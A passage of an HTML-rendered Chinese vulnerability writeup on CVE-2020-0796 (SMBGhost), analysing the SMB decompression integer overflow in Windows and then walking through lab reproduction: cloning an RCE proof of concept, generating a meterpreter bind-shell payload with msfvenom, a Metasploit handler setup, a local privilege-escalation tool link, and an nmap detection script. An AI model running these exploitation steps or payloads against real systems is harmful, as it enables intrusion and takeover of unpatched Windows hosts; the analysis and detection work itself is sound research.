+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">(</span><span class="n">ULONG</span><span class="p">)(</span><span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">OriginalCompressedSegmentSize</span> <span class="o">+</span> <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">Offset</span><span class="p">),</span> <span class="k">NULL</span><span class="p">);</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">If</span> <span class="p">(</span><span class="o">!</span><span class="n">Alloc</span><span class="p">)</span> <span class="err">{</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">return</span> <span class="n">STATUS_INSUFFICIENT_RESOURCES</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="err">}</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">ULONG</span> <span class="n">FinalCompressedSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">SmbCompressionDecompress</span><span class="p">(</span> <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">CompressionAlgorithm</span><span class="p">,</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">(</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">Header</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">COMPRESSION_TRANSFORM_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">Offset</span><span class="p">,</span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">(</span><span class="n">ULONG</span><span class="p">)(</span><span class="n">TotalSize</span> <span class="o">-</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">COMPRESSION_TRANSFORM_HEADER</span><span class="p">)</span> <span class="o">-</span> <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">Offset</span><span class="p">),</span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">(</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">Alloc</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">UserBuffer</span> <span class="o">+</span> <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">Offset</span><span class="p">,</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">OriginalCompressedSegmentSize</span><span class="p">,</span> <span class="err">\</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">FinalCompressedSize</span><span class="p">);</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="err">\</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span> <span class="err">\</span><span class="o">|</span><span class="err">\</span><span class="o">|</span> <span class="n">FinalCompressedSize</span> <span class="o">!=</span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">OriginalCompressedSegmentSize</span><span class="p">)</span> <span class="err">{</span> <span class="n">SrvNetFreeBuffer</span><span class="p">(</span><span class="n">Alloc</span><span class="p">);</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">return</span> <span class="n">STATUS_BAD_DATA</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="err">}</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">if</span> <span class="p">(</span><span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">Offset</span> <span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="err">{</span> <span class="n">memcpy</span><span class="p">(</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Alloc</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">UserBuffer</span><span class="p">,</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">(</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">Header</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">COMPRESSION_TRANSFORM_HEADER</span><span class="p">),</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">Offset</span><span class="p">);</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="err">}</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Srv2ReplaceReceiveBuffer</span><span class="p">(</span><span class="n">some_session_handle</span><span class="p">,</span> <span class="n">Alloc</span><span class="p">);</span> <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+
+<span class="err">}</span>
+</pre></div>
+
+
+<p>该Srv2DecompressData函数接收客户端发送的压缩消息，分配所需的内存量，并解压缩数据。然后，如果Offset字段不为零，它会将放置在压缩数据之前的数据复制到分配的缓冲区的开头。</p>
+<p><img alt="1.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId27.png" /></p>
+<p>如果仔细观察，我们会发现第20行和第31行可能导致某些输入的整数溢出。例如，大多数在bug发布后不久出现并导致系统崩溃的poc都使用0xffffff值作为Offset字段。使用该值0xffffff会在第20行触发整
+数溢出，因此分配的字节更少。</p>
+<p>稍后，它会在第31行触发额外的整数溢出。崩溃是由于在第30行中计算出的远离接收消息的地址处的内存访问造成的。如果代码在第31行验证了计算结果，那么它将很早退出，因为缓冲区长度恰好</p>
+<p>是负数且无法表示，这也使得第30行的地址本身也无效。</p>
+<p><img alt="2.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId28.png" /></p>
+<h3 id="3">3、选择溢出内容<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<p>只有两个相关字段可以控制以导致整数溢出的字段：OriginalCompressedSegmentSize和Offset，因
+此没有太多选择。在尝试了几种组合之后，下面的组合吸引了我们：如果我们发送一个合法的偏移值和一个巨大的原始压缩段大小值呢？让我们回顾一下代码将要执行的三个步骤：</p>
+<ol>
+<li>
+<p>分配：由于整数溢出，分配的字节数将小于两个字段的总和。</p>
+</li>
+<li>
+<p>解压缩：解压缩将收到一个非常大的OriginalCompressedSegmentSize值，将目标缓冲区视为具有无限大小。所有其他参数均不受影响，因此它将按预期执行。</p>
+</li>
+<li>
+<p>复制：如果要执行，则复制将按预期执行。</p>
+</li>
+</ol>
+<p>不管是否要执行复制步骤，它看起来已经很有趣了------我们可以在解压缩阶段触发越界写入，因为我们设法分配了比"分配"阶段所需的字节少的字节。</p>
+<p><img alt="3.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId30.png" /></p>
+<p>如您所见，使用这种技术，我们可以触发任何大小和内容的溢出，这是一个很好的开始。但是什么位于我们的缓冲区之外？让我们找出答案！</p>
+<h3 id="4srvnetallocatebuffer">4、深入分析SrvNetAllocateBuffer<a class="headerlink" href="#4srvnetallocatebuffer" title="Permanent link">&para;</a></h3>
+<p>为了回答这个问题，我们需要查看分配函数，在我们的例子中是SrvNetAllocateBuffer。下面是函数的有趣部分：</p>
+<div class="codehilite"><pre><span></span><span class="n">PALLOCATION_HEADER</span><span class="w"> </span><span class="n">SrvNetAllocateBuffer</span><span class="p">(</span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">AllocSize</span><span class="p">,</span><span class="w"> </span><span class="n">PALLOCATION_HEADER</span><span class="w"></span>
+<span class="n">SourceBuffer</span><span class="p">)</span><span class="w"></span>
+
+<span class="err">{</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="o">//</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SrvDisableNetBufferLookAsideList</span><span class="w"> </span><span class="err">\</span><span class="o">|</span><span class="err">\</span><span class="o">|</span><span class="w"> </span><span class="n">AllocSize</span><span class="w"> </span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w"> </span><span class="mh">0x100100</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="k">if</span><span class="w"></span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="p">(</span><span class="n">AllocSize</span><span class="w"> </span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w"> </span><span class="mh">0x1000100</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="k">NULL</span><span class="p">;</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="err">}</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="k">Result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SrvNetAllocateBufferFromPool</span><span class="p">(</span><span class="n">AllocSize</span><span class="p">,</span><span class="w"> </span><span class="n">AllocSize</span><span class="p">);</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="err">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="nc">int</span><span class="w"> </span><span class="n">LookasideListIndex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">AllocSize</span><span class="w"> </span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w"> </span><span class="mh">0x1100</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="n">LookasideListIndex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="err">\</span><span class="o">*</span><span class="w"> </span><span class="ow">some</span><span class="w"> </span><span class="n">calculation</span><span class="w"> </span><span class="n">based</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">AllocSize</span><span class="w"> </span><span class="err">\</span><span class="o">*/</span><span class="p">;</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="err">}</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="n">SOME_STRUCT</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SrvNetBufferLookasides</span><span class="o">[</span><span class="n">LookasideListIndex</span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">Result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="err">\</span><span class="o">*</span><span class="w"></span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="k">fetch</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="err">\</span><span class="o">*/</span><span class="p">;</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="err">}</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="o">//</span><span class="w"> </span><span class="k">Initialize</span><span class="w"> </span><span class="ow">some</span><span class="w"> </span><span class="k">Result</span><span class="w"> </span><span class="n">fields</span><span class="p">...</span><span class="w"></span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="k">Result</span><span class="p">;</span><span class="w"></span>
+
+<span class="err">}</span><span class="w"></span>
+</pre></div>
+
+
+<p>我们可以看到分配函数根据所需的字节数执行不同的操作。大型分配（大于约16MB）会导致执行失败。中型分配（大于约1\
+MB）使用SrvNetAllocateBufferFromPool函数进行分配。小型分配（其余\
+的）使用lookaside列表进行优化。</p>
+<p>注意：还有一个SrvDisableNetBufferLookAsideList标志会影响函数的功能，但是它是由一个未记录的注册表设置来设置的，并且默认情况下处于禁用状态，因此并不是很有趣。</p>
+<p>Lookaside列表用于有效地为驱动程序保留一组可重用的、固定大小的缓冲区。lookaside列表的功能之一是定义一个自定义的分配/释放函数，用于管理缓冲区。查看SrvNetBufferLookasides数组的引\
+用，我们发现它是在SrvNetCreateBufferLookasides函数中初始化的，通过查看它，我们了解到以下内容：</p>
+<blockquote>
+<p>自定义分配函数定义为SrvNetBufferLookasideAllocate，它只调用</p>
+<p>SrvNetAllocateBufferFromPool</p>
+<p>9个lookaside列表按以下大小创建，我们使用Python快速计算：</p>
+<p>>>> [hex((1 \&lt;\&lt; (i + 12)) + 256) for i in range(9)]</p>
+<div>
+<div class="MathJax_Preview">'0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100',
+'0x40100',\
+'0x80100', '0x100100'</div>
+<script type="math/tex; mode=display">'0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100',
+'0x40100',\
+'0x80100', '0x100100'</script>
+</div>
+<p>这与我们的发现相匹配，即分配大于0x100100字节的分配时不使用lookaside列表。</p>
+</blockquote>
+<p>结论是每个分配请求最终都出现在SrvNetAllocateBufferFromPool函数中，所以让我们来分析它。</p>
+<h3 id="5srvnetallocatebufferfrompool">5、SrvNetAllocateBufferFromPool和分配的缓冲区布局<a class="headerlink" href="#5srvnetallocatebufferfrompool" title="Permanent link">&para;</a></h3>
+<p>SrvNetAllocateBufferFromPool函数使用ExAllocatePoolWithTag函数在NonPagedPoolNx池中分配一个缓冲区，然后用数据填充一些结构。分配的缓冲区的布局如下：</p>
+<p><img alt="4.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId33.png" /></p>
+<p>在我们的研究范围内，此布局的唯一相关部分是用户缓冲区和分配头结构。我们可以马上看到，通过溢出用户缓冲区，我们最终会重写ALLOCATION_HEADER结构。看起来很方便。</p>
+<h3 id="6">6、重写分配头结构<a class="headerlink" href="#6" title="Permanent link">&para;</a></h3>
+<p>此时，我们的第一个想法是，由SmbCompressionDecompress调用之后的检查：</p>
+<div class="codehilite"><pre><span></span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="err">\</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span> <span class="err">\</span><span class="o">|</span><span class="err">\</span><span class="o">|</span> <span class="n">FinalCompressedSize</span> <span class="o">!=</span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">OriginalCompressedSegmentSize</span><span class="p">)</span> <span class="err">{</span> <span class="n">SrvNetFreeBuffer</span><span class="p">(</span><span class="n">Alloc</span><span class="p">);</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">return</span> <span class="n">STATUS_BAD_DATA</span><span class="p">;</span>
+
+<span class="err">}</span>
+</pre></div>
+
+
+<p>SrvNetFreeBuffer将被调用，并且该函数将失败，因为我们将其设计OriginalCompressedSegmentSize为一个很大的数字，并且FinalCompressedSize将成为一个较小的数字，代表实际的解压缩字节数。因此，我们分析了该SrvNetFreeBuffer函数，成功地替换了一个幻数的分配指针，然后等待free函数尝试对其进行释放，以期稍后将其用于free­after­free或类似用途。但是令我们惊讶的是，该memcpy函数崩溃了。这使我们感到高兴，因为我们根本没有想到哪里，但我们必须检查为什么会这样。可以在SmbCompressionDecompress函数的实现中找到说明：</p>
+<div class="codehilite"><pre><span></span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">NTSTATUS</span> <span class="n">SmbCompressionDecompress</span><span class="p">(</span> <span class="n">USHORT</span> <span class="n">CompressionAlgorithm</span><span class="p">,</span> <span class="n">PUCHAR</span>
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">UncompressedBuffer</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">UncompressedBufferSize</span><span class="p">,</span> <span class="n">PUCHAR</span> <span class="n">CompressedBuffer</span><span class="p">,</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">ULONG</span> <span class="n">CompressedBufferSize</span><span class="p">,</span> <span class="n">PULONG</span> <span class="n">FinalCompressedSize</span><span class="p">)</span>
+
+<span class="err">{</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="o">//</span> <span class="p">...</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">RtlDecompressBufferEx2</span><span class="p">(</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">...,</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">FinalUncompressedSize</span><span class="p">,</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="p">...);</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">if</span> <span class="p">(</span><span class="n">Status</span> <span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="err">{</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="err">\</span><span class="o">*</span><span class="n">FinalCompressedSize</span> <span class="o">=</span> <span class="n">CompressedBufferSize</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="err">}</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="o">//</span> <span class="p">...</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+
+<span class="err">}</span>
+</pre></div>
+
+
+<p>基本上，如果解压成功，FinalCompressedSize将更新为保存CompressedBufferSize的值，它是缓
+冲区的大小。这种对FinalCompressedSize返回值的故意更新对我们来说似乎非常可疑，因为这个小细节，加上分配的缓冲区布局，允许非常方便地利用这个bug。</p>
+<p>由于执行继续到复制原始数据的阶段，让我们再次检查调用：</p>
+<div class="codehilite"><pre><span></span><span class="n">memcpy</span><span class="err">（</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">Alloc</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">UserBuffer</span><span class="err">，</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="err">（</span><span class="n">PUCHAR</span><span class="err">）标题</span><span class="o">+</span> <span class="n">sizeof</span><span class="err">（</span><span class="n">COMPRESSION_TRANSFORM_HEADER</span><span class="err">），</span> <span class="n">Header</span><span class="o">-</span><span class="err">\</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">Offset</span><span class="err">）</span><span class="p">;</span>
+</pre></div>
+
+
+<p>从ALLOCATION_HEADER结构中读取目标地址，我们可以覆盖该结构。缓冲区的内容和大小也由我们控制。</p>
+<h3 id="7">7、本地权限提升<a class="headerlink" href="#7" title="Permanent link">&para;</a></h3>
+<p>既然我们有了写在哪里开发，我们能用它做什么？很明显我们可以让系统崩溃。我们可能能够触发远程代码执行，但我们还没有找到这样做的方法。如果我们在本地主机上使用此漏洞并泄漏其他信息，
+我们可以将其用于本地权限提升，因为已经通过几种技术证明了这一点</p>
+<p>我们尝试的第一种技术是Morten Schenk在其《<em>Black Hat USA</em>
+<em>2017》演讲中提出的</em>。该技术涉及重写win32的.data部分中的函数指针数据库系统驱动程序，然后从用户模式调用相应的函数以获得代码执行。j00ru写了一篇关于在WCTF
+2018中使用此技术的精彩文章，并提供了他的漏洞源代码。我们针对write what
+where漏洞进行了调整，但发现它不起作用，因为处理SMB消息的线程不是GUI线</p>
+<p>程。因此，win32数据库系统没有映射，而且技术也不相关（除非有办法使它成为一个GUI线程，这是我们没有研究过的）。</p>
+<p>我们最终在2012年的黑帽演示中使用了cesarcer所介绍的著名技术---轻松本地Windows内核开发。
+该技术是通过使用NtQuerySystemInformation（SystemHandleInformation）API泄漏当前进程令牌
+地址，然后重写该地址，授予当前进程令牌权限，这些权限可用于权限提升。Bryan
+Alexander（dronesec）和Stephen
+Breen（breenmachine）（2017）在EoP研究中滥用代理权限，
+展示了使用各种令牌特权提升特权的几种方法。</p>
+<p>我们基于Alexandre
+Beaulieu在利用任意写操作提升权限writeup时共享的代码进行攻击。在修改进程的令牌特权后，我们通过将DLL注入winlogon.exe.
+DLL的全部目的是启动命令提示符.
+我们的完整本地特权升级证明可在*此处*找到，仅可用于研究/防御目的。</p>
+<h2 id="cve20200796-rce">四、CVE­2020­0796 RCE漏洞复现<a class="headerlink" href="#cve20200796-rce" title="Permanent link">&para;</a></h2>
+<h3 id="_5">环境准备<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>攻击机：kal2019 ip:192.168.1.101</p>
+<p>目标靶机：windows10 1903 x64 (专业版，企业版也可以） ip:192.168.1.103</p>
+<p>目 标 靶 机 的 下 载 地 址 ：
+ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|
+47D4C57E638DF8BF74C59261E2CE702D|/</p>
+<p><strong>环境要求：</strong></p>
+<p>该poc不太稳定，需要多次测试(猜测是占用监听端口或者网络问题），有可能出现蓝屏现象(2).如果POC失败，可能是目标系统开启系统自带的defender拦截了。</p>
+<p><strong>复现步骤</strong></p>
+<p>kali下克隆下载利用poc</p>
+<p><code class="codehilite"><span class="err">root\@kali2019:/opt\# git clone* https://github.com/ianxtianxt/SMBGhost_RCE_PoC.git</span></code></p>
+<p><img alt="5.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId38.jpg" /></p>
+<p>切换到利用poc目录下</p>
+<p><code class="codehilite"><span class="err">root\@kali2019:/opt\# cd SMBGhost_RCE_PoC/</span></code></p>
+<p><img alt="6.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId39.jpg" /></p>
+<p>该POC需要用python3环境执行</p>
+<p><img alt="7.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId40.png" /></p>
+<p>可以看到目标靶机的IP地址以及系统版本</p>
+<p><img alt="8.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId41.png" /></p>
+<p><img alt="9.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId42.png" /></p>
+<p>在kali下生成python版本的反弹shellcode</p>
+<p><code class="codehilite"><span class="err">root\@kali2019:\~\# msfvenom ``­``p windows/x64/meterpreter/bind_tcp lport=2333 ``­``f py ``­``o exp.py</span></code></p>
+<p><img alt="10.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId43.jpg" /></p>
+<p><img alt="11.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId44.png" /></p>
+<p>可以看到生成的shellcode root\@kali2019:~# cat exp.py</p>
+<p>将生成的exp.py代码中的变量buf全部替换成变量USER_PAYLOAD，然后将所有代码粘贴覆盖下面的代码处：</p>
+<p><img alt="12.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId45.jpg" /></p>
+<p>在kali上启动MSF，并如下设置<code class="codehilite"><span class="err">msf5 \&gt; use exploit/multi/handler</span></code></p>
+<p><code class="codehilite"><span class="err">msf5 exploit(multi/handler) \&gt; set payload windows/x64/meterpreter/bind_tcp</span></code>\
+#设置反弹模式msf5 exploit(multi/handler) > set rhost 192.168.1.103\
+#设置目标靶机IP地址</p>
+<p><img alt="13.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId46.png" /></p>
+<p><code class="codehilite"><span class="err">msf5 exploit(multi/handler) \&gt; set lport 2333 \#设置监听端口msf5</span></code>\
+<code class="codehilite"><span class="err">exploit(multi/handler) \&gt; exploit</span></code></p>
+<p>执行利用poc，可以看到成功执行，在按任意键，最好回车键即可<code class="codehilite"><span class="err">python3 exploit.py ``­``ip 192.168.1.103</span></code></p>
+<p><img alt="14.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId47.jpg" /></p>
+<p><img alt="15.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId48.jpg" /></p>
+<p>在msf可以看到成功反弹出目标靶机的shell</p>
+<h3 id="cve20200796">五、CVE­2020­0796 本地提权漏洞复现<a class="headerlink" href="#cve20200796" title="Permanent link">&para;</a></h3>
+<p>环境要求，需要windows 10 1909 x64</p>
+<p>下 载 地 址 ：\
+ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|\
+9BCD5FA6C8009E4D0260E4B23008BD47|/</p>
+<p><strong>提权POC:</strong></p>
+<div class="codehilite"><pre><span></span><span class="c">https://download.0-sec.org/系统安全/Windows/CVE-2020-0796提权poc.zip</span>
+</pre></div>
+
+
+<p><img alt="16.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId50.png" /></p>
+<p>这里我新建了一个普通权限的账号，可以看到权限很小</p>
+<p><img alt="17.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId51.png" /></p>
+<p>在普通账号上执行cve­2020­0796­local.exe，可以看到成功提权到system权限</p>
+<p><img alt="18.jpg" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId52.jpg" /></p>
+<h3 id="_6">六、漏洞检测<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p><img alt="19.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId54.png" />
+奇 安 信 批 量 检 测 工 具 ：
+<em><a href="http://dl.qianxin.com/skylar6/CVE">http://dl.qianxin.com/skylar6/CVE</a>­2020­0796­Scanner.zip</em></p>
+<p>sh 脚 本 检 测 ：
+<a href="https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de937f5b6810df4441cc84f0fa63991e2e/check-smb-v3.11.sh">https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de9\
+37f5b6810df4441cc84f0fa63991e2e/check­smb­v3.11.sh</a></p>
+<p><img alt="20.png" src="../resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId56.png" /></p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/bin/bash</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> -eq <span class="m">0</span> <span class="o">]</span>
+  <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s1">$&#39;Usage:\n\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR&#39;</span>
+    <span class="nb">exit</span> <span class="m">1</span>
+<span class="k">fi</span>
+
+<span class="nb">echo</span> <span class="s2">&quot;Checking if there&#39;s SMB v3.11 in&quot;</span> <span class="nv">$1</span> <span class="s2">&quot;...&quot;</span>
+
+nmap -p445 --script smb-protocols -Pn -n <span class="nv">$1</span> <span class="p">|</span> grep -P <span class="s1">&#39;\d+\.\d+\.\d+\.\d+|^\|.\s+3.11&#39;</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39; &#39;</span> <span class="p">|</span> replace <span class="s1">&#39;Nmap scan report for&#39;</span> <span class="s1">&#39;@&#39;</span> <span class="p">|</span> tr <span class="s2">&quot;@&quot;</span> <span class="s2">&quot;\n&quot;</span> <span class="p">|</span> grep <span class="m">3</span>.11 <span class="p">|</span> tr <span class="s1">&#39;|&#39;</span> <span class="s1">&#39; &#39;</span> <span class="p">|</span> tr <span class="s1">&#39;_&#39;</span> <span class="s1">&#39; &#39;</span> <span class="p">|</span> grep -oP <span class="s1">&#39;\d+\.\d+\.\d+\.\d+&#39;</span>
+
